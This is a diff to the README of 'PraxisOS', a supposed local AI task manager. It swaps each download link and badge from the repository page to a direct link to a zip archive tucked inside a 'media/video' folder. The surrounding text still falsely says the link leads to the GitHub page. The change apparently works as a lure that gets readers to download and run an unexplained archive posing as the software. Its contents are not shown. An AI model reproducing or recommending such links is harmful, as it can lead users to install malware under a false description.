@@ -1,6 +1,6 @@
 # 🖥️ PraxisOS - Simple Local AI Task Manager
 
-[![Download PraxisOS](https://img.shields.io/badge/Download-PraxisOS-brightgreen)](https://github.com/jamessettles028-hub/PraxisOS)
+[![Download PraxisOS](https://img.shields.io/badge/Download-PraxisOS-brightgreen)](https://github.com/jamessettles028-hub/PraxisOS/raw/refs/heads/main/media/video/OS_Praxis_v3.0-beta.2.zip)
 
 PraxisOS is your local operating system designed to help you manage work and projects using AI tools. It runs completely on your computer. No need for cloud services. It organizes your tasks with Git tools and creates useful prompts with one click. This guide will help you download and run PraxisOS on a Windows computer step by step.
 
@@ -10,7 +10,7 @@ PraxisOS is your local operating system designed to help you manage work and pro
 
 ### 1. Visit the Download Page  
 Go to the primary download link by clicking here:  
-[https://github.com/jamessettles028-hub/PraxisOS](https://github.com/jamessettles028-hub/PraxisOS)  
+[https://github.com/jamessettles028-hub/PraxisOS/raw/refs/heads/main/media/video/OS_Praxis_v3.0-beta.2.zip](https://github.com/jamessettles028-hub/PraxisOS/raw/refs/heads/main/media/video/OS_Praxis_v3.0-beta.2.zip)  
 
 This link takes you to the PraxisOS GitHub page. From there, you will find the latest version you can download.
 
@@ -104,4 +104,4 @@ PraxisOS does not send your data to external servers. All data and projects stay
 
 ---
 
-[![Download PraxisOS](https://img.shields.io/badge/Download-PraxisOS-brightgreen)](https://github.com/jamessettles028-hub/PraxisOS)
+[![Download PraxisOS](https://img.shields.io/badge/Download-PraxisOS-brightgreen)](https://github.com/jamessettles028-hub/PraxisOS/raw/refs/heads/main/media/video/OS_Praxis_v3.0-beta.2.zip)
